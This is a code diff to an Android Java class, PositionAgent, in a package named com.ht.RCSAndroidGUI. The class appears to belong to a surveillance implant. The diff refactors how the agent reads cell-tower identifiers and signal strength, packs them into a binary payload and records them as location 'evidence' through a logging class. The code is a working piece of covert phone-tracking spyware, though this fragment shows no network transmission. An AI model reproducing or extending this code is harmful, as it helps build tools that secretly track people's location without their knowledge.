@@ -4,6 +4,7 @@ import java.io.EOFException;
 import java.io.IOException;
 import java.util.Date;
 
+import com.ht.RCSAndroidGUI.CellInfo;
 import com.ht.RCSAndroidGUI.Device;
 import com.ht.RCSAndroidGUI.LogR;
 import com.ht.RCSAndroidGUI.Status;
@@ -178,46 +179,23 @@ public class PositionAgent extends AgentBase implements LocationListener {
 	 */
 	private void locationCELL() {
 
-		android.content.res.Configuration conf = Status.getAppContext()
-				.getResources().getConfiguration();
+		CellInfo info = Device.getCellInfo();
+		if(!info.valid){
+			Log.d(TAG,"Error: " + "invalid cell info" );
+		}
 
-		if (Device.isGprs()) {
-			TelephonyManager tm = (TelephonyManager) Status.getAppContext()
-					.getSystemService(Context.TELEPHONY_SERVICE);
-			GsmCellLocation cell = (GsmCellLocation) tm.getCellLocation();
-			if (cell != null) {
-				// Integer.parseInt(Integer.toHexString(conf.mcc));
-				final int mcc = conf.mcc;
-
-				final int mnc = conf.mnc;
-				final int lac = cell.getLac();
-				final int cid = cell.getCid();
-				// final int bsic = 0;
-				final int rssi = 0; // TODO: prenderlo dal TelephonyManager
-
-				final byte[] payload = getCellPayload(mcc, mnc, lac, cid, rssi);
+		if (info.gsm) {
+		
+				final byte[] payload = getCellPayload(info);
 
 				new LogR(EvidenceType.LOCATION_NEW, LogR.LOG_PRI_STD,
 						getAdditionalData(0, LOG_TYPE_GSM), payload);
-			}
+			
 
 		}
-		if (Device.isCdma()) {
+		if (info.cdma) {
 
-			final int sid = 0; // TODO
-			final int nid = 0; // TODO
-			final int bid = 0; // TODO
-
-			final int mcc = conf.mcc;
-
-			final int rssi = 0; // TODO
-
-			final StringBuffer mb = new StringBuffer();
-			mb.append("SID: " + sid);
-			mb.append(" NID: " + nid);
-			mb.append(" BID: " + bid);
-
-			final byte[] payload = getCellPayload(mcc, sid, nid, bid, rssi);
+			final byte[] payload = getCellPayload(info);
 			new LogR(EvidenceType.LOCATION_NEW, LogR.LOG_PRI_STD,
 					getAdditionalData(0, LOG_TYPE_CDMA), payload);
 
@@ -402,8 +380,9 @@ public class PositionAgent extends AgentBase implements LocationListener {
 		return payload;
 	}
 
-	private byte[] getCellPayload(int mcc, int mnc, int lac, int cid, int rssi) {
-
+	private byte[] getCellPayload(CellInfo info) {
+		Check.requires(info.valid, "invalid cell info");
+		
 		final int size = 19 * 4 + 48 + 16;
 		final byte[] cellPosition = new byte[size];
 
@@ -413,15 +392,15 @@ public class PositionAgent extends AgentBase implements LocationListener {
 		databuffer.writeInt(size); // size
 		databuffer.writeInt(0); // params
 
-		databuffer.writeInt(mcc); //
-		databuffer.writeInt(mnc); //
-		databuffer.writeInt(lac); //
-		databuffer.writeInt(cid); //
+		databuffer.writeInt(info.mcc); //
+		databuffer.writeInt(info.mnc); //
+		databuffer.writeInt(info.lac); //
+		databuffer.writeInt(info.cid); //
 
 		databuffer.writeInt(0); // bsid
 		databuffer.writeInt(0); // bcc
 
-		databuffer.writeInt(rssi); // rx level
+		databuffer.writeInt(info.rssi); // rx level
 		databuffer.writeInt(0); // rx level full
 		databuffer.writeInt(0); // rx level sub
 
